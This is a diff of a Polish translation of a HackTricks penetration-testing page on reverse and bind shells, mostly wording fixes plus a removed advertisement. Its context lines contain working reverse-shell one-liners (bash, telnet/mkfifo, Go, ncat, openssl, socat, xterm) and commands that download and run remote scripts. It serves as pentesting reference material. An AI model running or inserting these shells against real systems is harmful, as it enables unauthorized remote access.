@@ -14,7 +14,7 @@ Inne sposoby wsparcia HackTricks:
 
 </details>
 
-**Jeśli masz pytania dotyczące któregokolwiek z tych shelli, możesz je sprawdzić na** [**https://explainshell.com/**](https://explainshell.com)
+**Jeśli masz pytania dotyczące któregokolwiek z tych shelli, możesz je sprawdzić za pomocą** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Pełne TTY
 
@@ -59,14 +59,14 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Jeśli napotkasz **lukę RCE** w aplikacji internetowej opartej na systemie Linux, może się zdarzyć, że **uzyskanie odwrotnego shella stanie się trudne** z powodu obecności reguł Iptables lub innych filtrów. W takich sytuacjach rozważ utworzenie shella PTY w skompromitowanym systemie za pomocą potoków.
+Jeśli napotkasz **lukę RCE** w aplikacji internetowej opartej na systemie Linux, może się zdarzyć, że **uzyskanie odwrotnego shella stanie się trudne** z powodu obecności reguł Iptables lub innych filtrów. W takich scenariuszach rozważ utworzenie powłoki PTY w skompromitowanym systemie za pomocą potoków.
 
 Kod znajdziesz na [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
 Musisz tylko zmodyfikować:
 
 * Adres URL hosta podatnego
-* Prefiks i sufiks twojego payloadu (jeśli jest)
+* Prefiks i sufiks twojego payloadu (jeśli istnieją)
 * Sposób wysyłania payloadu (nagłówki? dane? dodatkowe informacje?)
 
 Następnie możesz po prostu **wysyłać polecenia** lub nawet **użyć polecenia `upgrade`** aby uzyskać pełny PTY (zauważ, że potoki są czytane i zapisywane z opóźnieniem około 1,3 s).
@@ -87,7 +87,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet jest protokołem sieciowym służącym do zdalnego logowania się na urządzenia. Może być używany do zdalnego zarządzania systemami oraz przesyłania danych tekstowych. Telnet przesyła dane w postaci zwykłego tekstu, co oznacza, że nie jest zabezpieczony i może być podatny na ataki typu "man-in-the-middle". Zaleca się unikanie korzystania z Telnetu na rzecz bardziej bezpiecznych protokołów, takich jak SSH.
+Telnet jest protokołem sieciowym, który umożliwia zdalne logowanie do hosta. Może być używany do zdalnego zarządzania systemem oraz do przesyłania poleceń. Telnet przesyła dane w postaci tekstu, co oznacza, że ​​nie jest zaszyfrowany i może stanowić ryzyko dla bezpieczeństwa.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -147,15 +147,9 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Znajdź najważniejsze podatności, aby móc je szybciej naprawić. Intruder śledzi powierzchnię ataku, przeprowadza proaktywne skanowania zagrożeń, znajduje problemy w całym stosie technologicznym, od interfejsów API po aplikacje internetowe i systemy chmurowe. [**Wypróbuj za darmo**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) już dziś.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
+
+Go (znany również jako Golang) jest językiem programowania stworzonym przez Google. Jest często używany do tworzenia efektywnych narzędzi do programowania sieciowego i rozproszonego. Jego składnia jest podobna do języka C, ale zawiera wiele nowoczesnych funkcji, takich jak automatyczne zarządzanie pamięcią.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
@@ -211,7 +205,7 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
 ## OpenSSL
 
-Atakujący (Kali)
+Napastnik (Kali)
 ```bash
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
@@ -229,7 +223,7 @@ openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_cli
 
 [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
 
-### Powłoka typu bind
+### Powiąż powłokę
 ```bash
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
@@ -286,7 +280,7 @@ To spróbuje połączyć się z twoim systemem na porcie 6001:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Aby przechwycić odwróconą powłokę, możesz użyć (która będzie nasłuchiwać na porcie 6001):
+Aby przechwycić odwrotną powłokę, możesz użyć (która będzie nasłuchiwać na porcie 6001):
 ```bash
 # Authorize host
 xhost +targetip
@@ -319,6 +313,6 @@ Inne sposoby wsparcia HackTricks:
 * Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
 
 </details>
